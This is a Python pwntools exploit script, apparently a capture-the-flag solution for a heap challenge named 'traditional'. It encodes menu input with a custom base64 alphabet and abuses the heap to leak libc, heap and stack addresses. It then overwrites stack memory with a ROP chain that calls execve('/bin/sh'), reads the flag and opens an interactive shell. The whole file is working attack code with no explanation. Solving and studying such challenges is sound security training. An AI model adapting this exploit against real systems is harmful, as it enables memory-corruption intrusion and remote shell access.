from pwn import *


CUSTOM_B64 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
STANDARD_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"


def encode_menu(data):
    if isinstance(data, int):
        data = str(data).encode()
    if isinstance(data, str):
        data = data.encode()
    encoded = base64.b64encode(data).decode()
    return encoded.translate(str.maketrans(STANDARD_B64, CUSTOM_B64)).encode()


class TraditionalClient:
    def __init__(self, tube):
        self.io = tube

    def choice(self, item):
        self.io.sendlineafter(b"choice: ", encode_menu(item))

    def add(self, size, idx):
        self.choice(1)
        self.io.sendline(encode_menu(size))
        self.io.sendline(encode_menu(idx))

    def delete(self, idx):
        self.choice(4)
        self.io.sendline(encode_menu(idx))

    def show(self, idx):
        self.choice(3)
        self.io.sendline(encode_menu(idx))

    def edit(self, idx, content):
        self.choice(2)
        self.io.sendline(encode_menu(idx))
        self.io.sendline(encode_menu(content))

    def copy(self, src, dst, size):
        self.choice(7)
        self.io.sendline(encode_menu(src))
        self.io.sendline(encode_menu(dst))
        self.io.sendline(encode_menu(size))


def read_ptr(tube, nbytes):
    return u64(tube.recv(nbytes).ljust(8, b"\x00"))


def exploit(c, libc):
    for idx in range(8):
        c.add(0x100, idx)

    for idx in range(1, 8):
        c.delete(idx)
    c.delete(0)

    for idx in range(1, 8):
        c.add(0x100, idx)
    c.add(0x100, 0)

    c.show(0)
    libc.address = read_ptr(c.io, 6) - 0x233C20

    c.show(7)
    heap_base = read_ptr(c.io, 5) << 12

    c.add(0x380, 10)
    c.delete(10)

    c.edit(0, b"a" * 96 + p64(libc.sym["environ"] - 0x18))
    c.edit(7, b"b" * 0x100)
    c.copy(7, 0, (-0x10) & 0xFFFFFFFF)

    c.add(0x380, 10)
    c.copy(0, 10, 0x19)
    c.show(10)
    c.io.recv(0x18)
    stack_addr = read_ptr(c.io, 6)

    c.add(0x390, 11)
    c.delete(11)
    c.edit(0, b"a" * (96 + 8) + p64(stack_addr - 0x11F2 - 0x20))
    c.copy(7, 0, (-0x10) & 0xFFFFFFFF)
    c.add(0x390, 11)

    log.info("libc_base = %#x", libc.address)
    log.info("heap_base = %#x", heap_base)
    log.info("stack = %#x", stack_addr)

    pop_rdi = libc.address + 0x11B87A
    pop_rsi = libc.address + 0x5C207
    pop_rdx = libc.address + 0x48C92

    chain = flat(
        p64(pop_rdi + 1) * (0x20 - 9),
        p64(pop_rdi),
        p64(next(libc.search(b"/bin/sh\x00"))),
        p64(pop_rsi),
        p64(0),
        p64(pop_rdx),
        p64(0),
        p64(libc.sym["execve"]),
    )
    c.edit(7, chain)
    c.copy(7, 11, 0x100)
    c.io.sendline(b"cat flag")
    c.io.interactive()


def parse_args():
    parser = ArgumentParser(description="traditional heap exploit refactor")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", default=8888, type=int)
    parser.add_argument("--binary", default="./traditional")
    parser.add_argument("--libc", default="./lib/x86_64-linux-gnu/libc.so.6")
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--debug", action="store_true")
    return parser.parse_args()


def main():
    args = parse_args()
    context.arch = "amd64"
    context.log_level = "debug" if args.debug else "info"
    libc = ELF(args.libc)
    tube = process(args.binary) if args.local else remote(args.host, args.port)
    exploit(TraditionalClient(tube), libc)


if __name__ == "__main__":
    main()
